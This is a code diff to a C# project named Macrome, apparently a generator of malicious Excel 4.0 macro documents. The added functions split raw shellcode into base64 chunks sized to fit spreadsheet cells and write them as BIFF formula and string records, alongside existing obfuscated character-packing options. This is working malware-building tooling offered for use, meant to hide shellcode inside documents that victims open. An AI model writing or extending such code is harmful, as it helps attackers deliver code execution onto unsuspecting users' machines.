@@ -50,6 +50,29 @@ namespace Macrome
             macros.Add("END");
             return macros;
         }
+        
+        public static List<string> BuildBase64PayloadMacros(byte[] shellcode)
+        {
+            List<string> base64Strings = new List<string>(); 
+            //Base64 expansion is 4/3, and we have 252 bytes to spend, so we can have 189 bytes / cell
+            //As an added bonus, 189 is always divisible by 3, so we won't have == padding.
+            int maxBytesPerCell = 189;
+            for (int offset = 0; offset < shellcode.Length; offset += maxBytesPerCell)
+            {
+                byte[] guidShellcode;
+                if (shellcode.Length - offset < maxBytesPerCell)
+                {
+                    guidShellcode = shellcode.Skip(offset).ToArray();
+                }
+                else
+                {
+                    guidShellcode = shellcode.Skip(offset).Take(maxBytesPerCell).ToArray();
+                }
+                base64Strings.Add(Convert.ToBase64String(guidShellcode));
+            }
+            base64Strings.Add("END");
+            return base64Strings;
+        }
 
         private static Stack<AbstractPtg> GetGotoForCell(int rw, int col)
         {
@@ -196,6 +219,36 @@ namespace Macrome
             return ptgStack;
         }
 
+        public static List<BiffRecord> ConvertBase64StringsToRecords(List<string> base64Strings, int rwStart,
+            int colStart)
+        {
+            List<BiffRecord> records = new List<BiffRecord>();
+
+            int curRow = rwStart;
+            int curCol = colStart;
+
+            foreach (var base64String in base64Strings)
+            {
+                records.AddRange(GetRecordsForString(base64String, curRow, curCol));
+                curRow += 1;
+            }
+
+            return records;
+        }
+        
+        public static List<BiffRecord> GetRecordsForString(string str, int rw, int col)
+        {
+            List<BiffRecord> records = new List<BiffRecord>();
+            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
+            ptgStack.Push(new PtgStr("A", false));
+            Cell targetCell = new Cell(rw, col);
+            BiffRecord record = new Formula(targetCell, FormulaValue.GetStringFormulaValue(), false,
+                new CellParsedFormula(ptgStack));
+            records.Add(record);
+            records.Add(new STRING(str, false));
+            return records;
+        }
+        
         public static List<BiffRecord> ConvertStringsToRecords(List<string> strings, int rwStart, int colStart, int dstRwStart, int dstColStart,
             int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
         {
@@ -319,15 +372,7 @@ namespace Macrome
             return formulas;
         }
 
-        public static BiffRecord GetRecordForString(string str, int rw, int col)
-        {
-            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
-            ptgStack.Push(new PtgStr(str, false));
-            Cell targetCell = new Cell(rw, col);
-            BiffRecord record = new Formula(targetCell, FormulaValue.GetEmptyStringFormulaValue(), true,
-                new CellParsedFormula(ptgStack));
-            return record;
-        }
+
 
         public static List<BiffRecord> ConvertChunkedStringToFormulas(List<string> chunkedString, int rwStart, int colStart, int dstRw,
             int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
